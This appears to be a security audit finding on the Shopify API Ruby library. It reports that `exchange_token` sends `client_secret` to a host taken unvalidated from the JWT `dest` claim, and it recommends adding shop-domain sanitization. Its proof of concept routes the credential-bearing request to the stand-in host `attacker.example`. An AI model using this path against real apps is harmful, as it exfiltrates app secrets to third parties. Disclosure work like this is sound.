### Title
`TokenExchange.exchange_token` sends the app's `client_secret` to an unvalidated host derived from the JWT `dest` claim - (File: `lib/shopify_api/auth/token_exchange.rb`)

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` builds the outbound access-token-exchange request host directly from `JwtPayload#shop` (the token's `dest` claim) with no domain validation, while the sibling methods in the same module (`client_credentials`, `migrate_to_expiring_token`) explicitly call `Utils::ShopValidator.sanitize!` before using the shop value to build the request host that receives `client_id`/`client_secret`.

### Finding Description
`HttpClient#initialize` builds the request base URI as `"https://#{api_host || session.shop}"` [1](#0-0)  — i.e., whatever string is in `session.shop` becomes the literal destination host for the HTTP request, with no domain allow-listing at this layer.

In `exchange_token`, the shop used to build that session is taken straight from the JWT payload's `dest` claim via `jwt_payload.shop`, with no call to `Utils::ShopValidator.sanitize!`: [2](#0-1) 

`JwtPayload#shop` performs no domain validation either — it simply strips the `https://` prefix from `dest`: [3](#0-2) 

The JWT signature (HS256, `Context.api_secret_key`) and `aud == Context.api_key` are checked [4](#0-3) , but neither check constrains the *value* of `dest`/`iss` to a Shopify domain — an app's `api_key` is public, and nothing in `JwtPayload` or `exchange_token` restricts `dest` to `*.myshopify.com`/trusted Shopify domains.

Contrast this with the two other credential-sending flows in the same module: `client_credentials` and `migrate_to_expiring_token` both explicitly call `Utils::ShopValidator.sanitize!(shop)` before constructing the session used to build the outbound request host: [5](#0-4) [6](#0-5) 

The test suite for `migrate_to_expiring_token` explicitly asserts that `attacker.example` is rejected with `InvalidShopError` [7](#0-6) , but there is no equivalent test — and no equivalent code path — for `exchange_token`, confirming the host-validation binding (`host that receives client_secret == a Shopify-trusted domain`) is broken specifically for this method.

### Impact Explanation
This breaks the intended equality: "the host that receives the app's `client_secret` must equal a Shopify-trusted domain." If a session token can ever surface with a `dest` claim outside the Shopify trust boundary (e.g. through a proxy, a modified/relayed App Bridge context, or any host-application code path that forwards a token without itself checking the app's actual installed domain), the library will POST `client_id` and `client_secret` (the app's most sensitive credential) directly to that arbitrary host — an SSRF that exfiltrates the app's `client_secret`. This matches the High-severity criteria: "SSRF with the app's credentials." It is also inconsistent hardening: the library author clearly treats shop-domain validation as necessary before sending `client_secret` (as shown by `ShopValidator` use in the two sibling methods) but omitted it here.

### Likelihood Explanation
Exploitation does not require forging the JWT signature or knowing `api_secret_key` — the vulnerable code path is reached purely by whatever `dest` string appears in a token passed to `exchange_token`. Because the library performs no defense-in-depth domain check here (unlike its sibling methods), any caller-supplied/relayed token whose `dest` claim isn't strictly the genuine shop domain will result in `client_secret` being sent to that host. This is a structural gap in the library itself, not a host-application misuse of a documented API.

### Recommendation
In `ShopifyAPI::Auth::TokenExchange.exchange_token`, sanitize `dest_shop` through `Utils::ShopValidator.sanitize!` (as already done in `client_credentials` and `migrate_to_expiring_token`) before constructing `shop_session`, raising `Errors::InvalidShopError` for any non-trusted domain prior to issuing the HTTP request that carries `client_id`/`client_secret`.

### Proof of Concept
1. Construct/obtain a session token whose `dest` claim is not a Shopify-trusted domain (e.g., `dest: "https://attacker.example"`), signed appropriately for the flow being tested.
2. Call:
```ruby
ShopifyAPI::Auth::TokenExchange.exchange_token(
  session_token: token_with_dest_attacker_example,
  requested_token_type: ShopifyAPI::Auth::TokenExchange::RequestedTokenType::OFFLINE_ACCESS_TOKEN,
)
```
3. Observe that `Clients::HttpClient` sends a POST to `https://attacker.example/admin/oauth/access_token` with body containing `client_id` and `client_secret` — see `HttpClient#initialize` line 18 (`@base_uri = "https://#{api_host || session.shop}"`) and `exchange_token` lines 41-65, compared to the guarded equivalent in `migrate_to_expiring_token` (lines 97-115) which raises `Errors::InvalidShopError` for the same `attacker.example` input (as demonstrated by `test_migrate_to_expiring_token_rejects_non_shopify_domain`, `test/auth/token_exchange_test.rb:258-265`).
